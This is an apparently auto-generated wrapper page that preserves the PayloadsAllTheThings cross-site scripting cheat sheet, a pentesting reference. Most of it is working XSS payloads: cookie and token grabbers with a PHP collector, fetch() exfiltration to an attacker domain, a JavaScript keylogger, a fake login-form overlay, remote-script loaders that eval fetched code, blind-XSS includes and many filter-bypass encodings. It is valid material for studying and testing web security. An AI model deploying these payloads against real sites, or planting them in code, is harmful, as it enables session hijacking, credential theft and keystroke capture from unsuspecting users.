---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Cross Site Scripting

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xss-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Cross Site Scripting](../../topics/xss-injection/cross-site-scripting.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xss-injection-readme |
| name | Cross Site Scripting |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# Cross Site Scripting\n\n> Cross-site scripting (XSS) is a type of computer security vulnerability typically found\
  \ in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.\n\n## Summary\n\
  \n- [Methodology](#methodology)\n- [Proof of Concept](#proof-of-concept)\n    - [Data Grabber](#data-grabber)\n    - [CORS](#cors)\n\
  \    - [UI Redressing](#ui-redressing)\n    - [Javascript Keylogger](#javascript-keylogger)\n    - [Other Ways](#other-ways)\n\
  - [Identify an XSS Endpoint](#identify-an-xss-endpoint)\n    - [Tools](#tools)\n- [XSS in HTML/Applications](#xss-in-htmlapplications)\n\
  \    - [Common Payloads](#common-payloads)\n    - [XSS using HTML5 tags](#xss-using-html5-tags)\n    - [XSS using a Remote\
  \ JS](#xss-using-a-remote-js)\n    - [XSS in Hidden Input](#xss-in-hidden-input)\n    - [XSS in Uppercase Output](#xss-in-uppercase-output)\n\
  \    - [DOM Based XSS](#dom-based-xss)\n    - [XSS in JS Context](#xss-in-js-context)\n- [XSS in Wrappers for URI](#xss-in-wrappers-for-uri)\n\
  \    - [Wrapper javascript:](#wrapper-javascript)\n    - [Wrapper data:](#wrapper-data)\n    - [Wrapper vbscript:](#wrapper-vbscript)\n\
  - [XSS in Files](#xss-in-files)\n    - [XSS in XML](#xss-in-xml)\n    - [XSS in SVG](#xss-in-svg)\n    - [XSS in Markdown](#xss-in-markdown)\n\
  \    - [XSS in CSS](#xss-in-css)\n- [XSS in PostMessage](#xss-in-postmessage)\n- [Blind XSS](#blind-xss)\n    - [XSS Hunter](#xss-hunter)\n\
  \    - [Other Blind XSS tools](#other-blind-xss-tools)\n    - [Blind XSS endpoint](#blind-xss-endpoint)\n    - [Tips](#tips)\n\
  - [Mutated XSS](#mutated-xss)\n- [Labs](#labs)\n- [References](#references)\n\n## Methodology\n\nCross-Site Scripting (XSS)\
  \ is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious\
  \ code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to\
  \ steal sensitive information, such as user login credentials, or to perform other malicious actions.\n\nThere are 3 main\
  \ types of XSS attacks:\n\n- **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that\
  \ is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker\
  \ could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks\
  \ on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such\
  \ as stealing their login credentials.\n\n- **Stored XSS**: In a stored XSS attack, the malicious code is stored on the\
  \ server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code\
  \ into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers,\
  \ allowing the attacker to perform various actions.\n\n- **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable\
  \ web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user\
  \ input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code\
  \ is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect\
  \ and prevent these types of attacks, because the server does not have any record of the malicious code.\n\nTo prevent XSS\
  \ attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary\
  \ criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters\
  \ in user input before rendering it in the browser, to prevent the browser from interpreting it as code.\n\n## Proof of\
  \ Concept\n\nWhen exploiting an XSS vulnerability, it’s more effective to demonstrate a complete exploitation scenario that\
  \ could lead to account takeover or sensitive data exfiltration. Instead of simply reporting an XSS with an alert payload,\
  \ aim to capture valuable data, such as payment information, personal identifiable information (PII), session cookies, or\
  \ credentials.\n\n### Data Grabber\n\nObtains the administrator cookie or sensitive access token, the following payload\
  \ will send it to a controlled page.\n\n```html\n<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>\n\
  <script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>\n<script>new\
  \ Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>\n<script>new Image().src=\"http://localhost/cookie.php?c=\"\
  +localStorage.getItem('access_token');</script>\n```\n\nWrite the collected data into a file.\n\n```php\n<?php\n$cookie\
  \ = $_GET['c'];\n$fp = fopen('cookies.txt', 'a+');\nfwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\");\nfclose($fp);\n?>\n```\n\
  \n### CORS\n\n```html\n<script>\n  fetch('https://[ATTACKER.DOMAIN.TLD]', {\n  method: 'POST',\n  mode: 'no-cors',\n  body:\
  \ document.cookie\n  });\n</script>\n```\n\n### UI Redressing\n\nLeverage the XSS to modify the HTML content of the page\
  \ in order to display a fake login form.\n\n```html\n<script>\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML\
  \ = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input\
  \ value='submit' type='submit'>\"\n</script>\n```\n\n### Javascript Keylogger\n\nAnother way to collect sensitive data is\
  \ to set a javascript keylogger.\n\n```javascript\n<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"\
  +String.fromCharCode(e.which))},this.remove();'>\n```\n\n### Other Ways\n\nMore exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):\n\
  \n- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)\n\
  - [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)\n- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)\n\
  - [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)\n- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)\n\
  - [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)\n\n## Identify an XSS Endpoint\n\nThis payload\
  \ opens the debugger in the developer console rather than triggering a popup alert box.\n\n```javascript\n<script>debugger;</script>\n\
  ```\n\nModern applications with content hosting can use [sandbox domains][sandbox-domains]\n\n> to safely host various types\
  \ of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or\
  \ Flash applets and make sure that they can't access any user data.\n\n[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html\n\
  \nFor this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default\
  \ XSS payload in order to know in which scope the XSS is actually executing.\n\nBetter payload replacing `<script>alert(1)</script>`:\n\
  \n```html\n<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>\n```\n\nWhile `alert()` is nice\
  \ for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution,\
  \ so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any\
  \ interaction).\n\nExample:\n\n```html\n<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\
  \\n\").concat(window.origin))</script>\n```\n\nAdditional reading:\n\n- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)\n\
  - [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)\n- [LiveOverflow blog\
  \ post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)\n\n### Tools\n\nMost tools are\
  \ also suitable for blind XSS attacks:\n\n- [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately\
  \ not very well maintained\n- [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities\n\
  - [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in\
  \ Go\n- [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby\n- [domdig](https://github.com/fcavallarin/domdig):\
  \ Headless Chrome XSS Tester\n\n## XSS in HTML/Applications\n\n### Common Payloads\n\n```javascript\n// Basic payload\n\
  <script>alert('XSS')</script>\n<scr<script>ipt>alert('XSS')</scr<script>ipt>\n\"><script>alert('XSS')</script>\n\"><script>alert(String.fromCharCode(88,83,83))</script>\n\
  <script>\\u0061lert('22')</script>\n<script>eval('\\x61lert(\\'33\\')')</script>\n<script>eval(8680439..toString(30))(983801..toString(36))</script>\
  \ //parseInt(\"confirm\",30) == 8680439 && 8680439..toString(30) == \"confirm\"\n<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\"\
  >\n\n// Img payload\n<img src=x onerror=alert('XSS');>\n<img src=x onerror=alert('XSS')//\n<img src=x onerror=alert(String.fromCharCode(88,83,83));>\n\
  <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>\n<img src=x:alert(alt) onerror=eval(src) alt=xss>\n\"><img\
  \ src=x onerror=alert('XSS');>\n\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>\n<><img src=1 onerror=alert(1)>\n\
  \n// Svg payload\n<svg\fonload=alert(1)>\n<svg/onload=alert('XSS')>\n<svg onload=alert(1)//\n<svg/onload=alert(String.fromCharCode(88,83,83))>\n\
  <svg id=alert(1) onload=eval(id)>\n\"><svg/onload=alert(String.fromCharCode(88,83,83))>\n\"><svg/onload=alert(/XSS/)\n<svg><script\
  \ href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)\n<svg><script>alert('33')\n<svg><script>alert&lpar;'33'&rpar;\n\
  \n// Div payload\n<div onpointerover=\"alert(45)\">MOVE HERE</div>\n<div onpointerdown=\"alert(45)\">MOVE HERE</div>\n<div\
  \ onpointerenter=\"alert(45)\">MOVE HERE</div>\n<div onpointerleave=\"alert(45)\">MOVE HERE</div>\n<div onpointermove=\"\
  alert(45)\">MOVE HERE</div>\n<div onpointerout=\"alert(45)\">MOVE HERE</div>\n<div onpointerup=\"alert(45)\">MOVE HERE</div>\n\
  ```\n\n### XSS using HTML5 tags\n\n```javascript\n<body onload=alert(/XSS/.source)>\n<input autofocus onfocus=alert(1)>\n\
  <select autofocus onfocus=alert(1)>\n<textarea autofocus onfocus=alert(1)>\n<keygen autofocus onfocus=alert(1)>\n<video/poster/onerror=alert(1)>\n\
  <video><source onerror=\"javascript:alert(1)\">\n<video src=_ onloadstart=\"alert(1)\">\n<details/open/ontoggle=\"alert`1`\"\
  >\n<audio src onloadstart=alert(1)>\n<marquee onstart=alert(1)>\n<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out\
  \ of 10</meter>\n\n<body ontouchstart=alert(1)> // Triggers when a finger touch the screen\n<body ontouchend=alert(1)> \
  \  // Triggers when a finger is removed from touch screen\n<body ontouchmove=alert(1)>  // When a finger is dragged across\
  \ the screen.\n```\n\n### XSS using a remote JS\n\n```html\n<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>\n\
  <script src=14.rs>\n// you can also specify an arbitrary payload with 14.rs/#payload\ne.g: 14.rs/#alert(document.domain)\n\
  ```\n\n### XSS in Hidden Input\n\n```javascript\n<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">\nUse CTRL+SHIFT+X\
  \ to trigger the onclick event\n```\n\nin newer browsers : firefox-130/chrome-108\n\n```javascript\n<input type=\"hidden\"\
  \ oncontentvisibilityautostatechange=\"alert(1)\"  style=\"content-visibility:auto\" >\n```\n\n### XSS in Uppercase Output\n\
  \n```javascript\n<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>\n```\n\n### DOM Based XSS\n\nBased on a DOM XSS sink.\n\
  \n```javascript\n#\"><img src=/ onerror=alert(2)>\n```\n\n### XSS in JS Context\n\n```javascript\n-(confirm)(document.domain)//\n\
  ; alert(1);//\n// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)\n```\n\n## XSS\
  \ in Wrappers for URI\n\n### Wrapper javascript\n\n```javascript\njavascript:prompt(1)\n\n%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341\n\
  \n&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41\n\nWe can encode the\
  \ \"javascript:\" in Hex/Octal\n\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)\n\\u006A\\u0061\\u0076\\\
  u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)\n\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)\n\
  \nWe can use a 'newline character'\njava%0ascript:alert(1)   - LF (\\n)\njava%09script:alert(1)   - Horizontal tab (\\t)\n\
  java%0dscript:alert(1)   - CR (\\r)\n\nUsing the escape character\n\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)\n\nUsing\
  \ the newline and a comment //\njavascript://%0Aalert(1)\njavascript://anything%0D%0A%0D%0Awindow.alert(1)\n```\n\n### Wrapper\
  \ data\n\n```javascript\ndata:text/html,<script>alert(0)</script>\ndata:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+\n\
  <script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>\n```\n\n### Wrapper vbscript\n\nonly IE\n\n```javascript\n\
  vbscript:msgbox(\"XSS\")\n```\n\n## XSS in Files\n\n**NOTE:** The XML CDATA section is used here so that the JavaScript\
  \ payload will not be treated as XML markup.\n\n```xml\n<name>\n  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>\n\
  </name>\n```\n\n### XSS in XML\n\n```xml\n<html>\n<head></head>\n<body>\n<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\"\
  >alert(1)</something:script>\n</body>\n</html>\n```\n\n### XSS in SVG\n\nSimple script. Codename: green triangle\n\n```xml\n\
  <?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\
  >\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n  <polygon id=\"triangle\" points=\"\
  0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n  <script type=\"text/javascript\">\n    alert(document.domain);\n\
  \  </script>\n</svg>\n```\n\nMore comprehensive payload with svg tag attribute, desc script, foreignObject script, foreignObject\
  \ iframe, title script, animatetransform event and simple script. Codename: red ligthning. Author: noraj.\n\n```xml\n<?xml\
  \ version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\
  >\n\n<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"\
  alert('svg attribut')\">\n  <polygon id=\"lightning\" points=\"0,100 50,25 50,75 100,0\" fill=\"#ff1919\" stroke=\"#ff0000\"\
  />\n  <desc><script>alert('svg desc')</script></desc>\n  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>\n\
  \  <foreignObject width=\"500\" height=\"500\">\n    <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert('svg\
  \ foreignObject iframe');\" width=\"400\" height=\"250\"/>\n  </foreignObject>\n  <title><script>alert('svg title')</script></title>\n\
  \  <animatetransform onbegin=\"alert('svg animatetransform onbegin')\"></animatetransform>\n  <script type=\"text/javascript\"\
  >\n    alert('svg script');\n  </script>\n</svg>\n```\n\n#### Short SVG Payload\n\n```javascript\n<svg xmlns=\"http://www.w3.org/2000/svg\"\
  \ onload=\"alert(document.domain)\"/>\n\n<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>\n<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>\n\
  <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>\n```\n\n### Nesting SVG and XSS\n\nIncluding a remote SVG\
  \ image in a SVG works but won't trigger the XSS embedded in the remote SVG. Author: noraj.\n\nSVG 1.x (xlink:href)\n\n\
  ```xml\n<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\
  >\n  <image xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg\" height=\"200\" width=\"200\"/>\n</svg>\n```\n\
  \nIncluding a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's\
  \ impossible to add vulnerable attribute on a polygon/rect/etc since the `style` attribute is no longer a vector on modern\
  \ browsers. Author: noraj.\n\nSVG 1.x (xlink:href)\n\n```xml\n<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\"\
  \ xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <use xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning\"\
  />\n</svg>\n```\n\nHowever, including svg tags in SVG documents works and allows XSS execution from sub-SVGs. Codename:\
  \ french flag. Author: noraj.\n\n```xml\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\
  >\n  <svg x=\"10\">\n    <rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #002654\"/>\n    <script type=\"\
  text/javascript\">alert('sub-svg 1');</script>\n  </svg>\n  <svg x=\"200\">\n    <rect x=\"10\" y=\"10\" height=\"100\"\
  \ width=\"100\" style=\"fill: #ED2939\"/>\n    <script type=\"text/javascript\">alert('sub-svg 2');</script>\n  </svg>\n\
  </svg>\n```\n\n### XSS in Markdown\n\n```csharp\n[a](javascript:prompt(document.cookie))\n[a](j a v a s c r i p t:prompt(document.cookie))\n\
  [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\n[a](javascript:window.onerror=alert;throw%201)\n```\n\
  \n### XSS in CSS\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n<style>\ndiv  {\n    background-image: url(\"data:image/jpg;base64,<\\\
  /style><svg/onload=alert(document.domain)>\");\n    background-color: #cccccc;\n}\n</style>\n</head>\n  <body>\n    <div>lol</div>\n\
  \  </body>\n</html>\n```\n\n## XSS in PostMessage\n\n> If the target origin is asterisk * the message can be sent to any\
  \ domain has reference to the child page.\n\n```html\n<html>\n<body>\n    <input type=button value=\"Click Me\" id=\"btn\"\
  >\n</body>\n\n<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://10.10.10.10/#login');\n\
  \    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n\
  \                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n\
  </script>\n</html>\n```\n\n## Blind XSS\n\n### XSS Hunter\n\n> XSS Hunter allows you to find all kinds of cross-site scripting\
  \ vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon\
  \ firing, scan the page and send information about the vulnerable page to the XSS Hunter service.\n\nXSS Hunter is deprecated,\
  \ it was available at [https://xsshunter.com/app](https://xsshunter.com/app).\n\nYou can set up an alternative version\n\
  \n- Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)\n\
  - Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)\n\n```xml\n\"><script src=\"https://js.rip/[ATTACKER.DOMAIN.TLD]\"\
  ></script>\n\"><script src=//[ATTACKER.DOMAIN.TLD]></script>\n<script>$.getScript(\"//[ATTACKER.DOMAIN.TLD]\")</script>\n\
  ```\n\n### Other Blind XSS tools\n\n- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy)\
  \ - Sleepy Puppy XSS Payload Management Framework\n- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a\
  \ utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting.\n- [ssl/ezXSS](https://github.com/ssl/ezXSS)\
  \ - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.\n\n### Blind\
  \ XSS endpoint\n\n- Contact forms\n- Ticket support\n- Referer Header\n    - Custom Site Analytics\n    - Administrative\
  \ Panel logs\n- User Agent\n    - Custom Site Analytics\n    - Administrative Panel logs\n- Comment Box\n    - Administrative\
  \ Panel\n\n### Tips\n\nYou can use a [data grabber for XSS](#data-grabber) and a one-line HTTP server to confirm the existence\
  \ of a blind XSS before deploying a heavy blind-XSS testing tool.\n\nEg. payload\n\n```html\n<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>\n\
  ```\n\nEg. one-line HTTP server:\n\n```ps1\nruby -run -ehttpd . -p8080\n```\n\n## Mutated XSS\n\nUse browsers quirks to\
  \ recreate some HTML tags.\n\n**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify)\
  \ component on Google Search.\n\n```javascript\n<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">\n```\n\n\
  ## Labs\n\n- [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)\n- [Root Me\
  \ - XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)\n- [Root Me - XSS - Server Side](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)\n\
  - [Root Me - XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)\n- [Root Me - XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)\n\
  - [Root Me - XSS - Stored - Filter Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)\n\
  - [Root Me - XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)\n\
  - [Root Me - XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)\n- [Root\
  \ Me - XSS DOM Based - Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)\n- [Root Me - XSS DOM\
  \ Based - Filters Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)\n- [Root Me - XSS\
  \ - DOM Based](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)\n- [Root Me - Self XSS - DOM Secrets](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-DOM-Secrets)\n\
  - [Root Me - Self XSS - Race Condition](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition)\n\n##\
  \ References\n\n- [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) - Masato Kinugawa's (@kinugawamasato) - July 15,\
  \ 2016](https://web.archive.org/web/20260208084714/https://mksben.l0.cm/2016/07/xxn-caret.html)\n- [Account Recovery XSS\
  \ - Gábor Molnár - April 13, 2016](https://web.archive.org/web/20241005040655/https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss)\n\
  - [An XSS on Facebook via PNGs & Wonky Content Types - Jack Whitton (@fin1te) - January 27, 2016](https://web.archive.org/web/20171108050241/https://whitton.io/articles/xss-on-facebook-via-png-content-types/)\n\
  - [Bypassing Signature-Based XSS Filters: Modifying Script Code - PortSwigger - August 4, 2020](https://web.archive.org/web/20251008035916/https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)\n\
  - [Combination of techniques lead to DOM Based XSS in Google - Sasi Levi - September 19, 2016](https://web.archive.org/web/20180214031830/https://sasi2103.blogspot.sg:80/2016/09/combination-of-techniques-lead-to-dom.html)\n\
  - [Cross-site scripting (XSS) cheat sheet - PortSwigger - September 27, 2019](https://web.archive.org/web/20190927102245/https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n\
  - [Encoding Differentials: Why Charset Matters - Stefan Schiller - July 15, 2024](https://web.archive.org/web/20240715192800/https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)\n\
  - [Facebook's Moves - OAuth XSS - Paulos Yibelo - December 10, 2015](https://web.archive.org/web/20180508031244/https://www.paulosyibelo.com:80/2015/12/facebooks-moves-oauth-xss.html)\n\
  - [Frans Rosén on how he got Bug Bounty for Mega.co.nz XSS - Frans Rosén - February 14, 2013](https://web.archive.org/web/20231004090825/https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/)\n\
  - [Google XSS Turkey - Frans Rosén - June 6, 2015](https://web.archive.org/web/20231004100309/https://labs.detectify.com/2015/06/06/google-xss-turkey/)\n\
  - [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) - Marin Moulinier - March 9, 2017](https://web.archive.org/web/20260304011652/https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff)\n\
  - [Killing a bounty program, Twice - Itzhak (Zuk) Avraham and Nir Goldshlager - September 26, 2014](https://web.archive.org/web/20140926052901/http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)\n\
  - [Mutation XSS in Google Search -  Tomasz Andrzej Nidecki - April 10, 2019](https://web.archive.org/web/20260305093221/https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)\n\
  - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman\
  \ Frosch, Jonas Magazinius, Edward Z. Yang - September 26, 2013](https://web.archive.org/web/20250901044759/https://cure53.de/fp170.pdf)\n\
  - [postMessage XSS on a million sites - Mathias Karlsson - December 15, 2016](https://web.archive.org/web/20231004103135/https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)\n\
  - [RPO that lead to information leakage in Google - @filedescriptor - July 3, 2016](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)\n\
  - [Secret Web Hacking Knowledge: CTF Authors Hate These Simple Tricks - Philippe Dourassov - May 13, 2024](https://web.archive.org/web/20260105121400/https://youtu.be/Sm4G6cAHjWM)\n\
  - [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP\
  \ - Frans Rosén (fransrosen) - February 17, 2017](https://web.archive.org/web/20251111110702/https://hackerone.com/reports/207042)\n\
  - [Stored XSS affecting all fantasy sports [*.fantasysports.yahoo.com] - thedawgyg - December 7, 2016](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)\n\
  - [Stored XSS in *.ebay.com - Jack Whitton (@fin1te) - January 27, 2013](https://web.archive.org/web/20260117011606/https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/)\n\
  - [Stored XSS In Facebook Chat, Check In, Facebook Messenger - Nirgoldshlager - April 17, 2013](http://web.archive.org/web/20130420095223/http://www.breaksec.com/?p=6129)\n\
  - [Stored XSS on developer.uber.com via admin account compromise in Uber - James Kettle (@albinowax) - July 18, 2016](https://web.archive.org/web/20251219005750/https://hackerone.com/reports/152067)\n\
  - [Stored XSS on Snapchat - Mrityunjoy - February 9, 2018](https://web.archive.org/web/20250117225022/https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)\n\
  - [Stored XSS, and SSRF in Google using the Dataset Publishing Language - Craig Arendt - March 7, 2018](https://web.archive.org/web/20180307213445/https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)\n\
  - [Tricky HTML Injection and Possible XSS in sms-be-vip.twitter.com - Ahmed Aboul-Ela (@aboul3la) - July 9, 2016](https://web.archive.org/web/20250705123701/https://hackerone.com/reports/150179)\n\
  - [Twitter XSS by stopping redirection and javascript scheme - Sergey Bobrov (bobrov) - September 30, 2017](https://web.archive.org/web/20251206162237/https://hackerone.com/reports/260744)\n\
  - [Uber Bug Bounty: Turning Self-XSS into Good XSS - Jack Whitton (@fin1te) - March 22, 2016](https://web.archive.org/web/20260301051605/https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)\n\
  - [Uber Self XSS to Global XSS - httpsonly - August 29, 2016](https://web.archive.org/web/20180701015455/https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)\n\
  - [Unleashing an Ultimate XSS Polyglot - Ahmed Elsobky - February 16, 2018](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)\n\
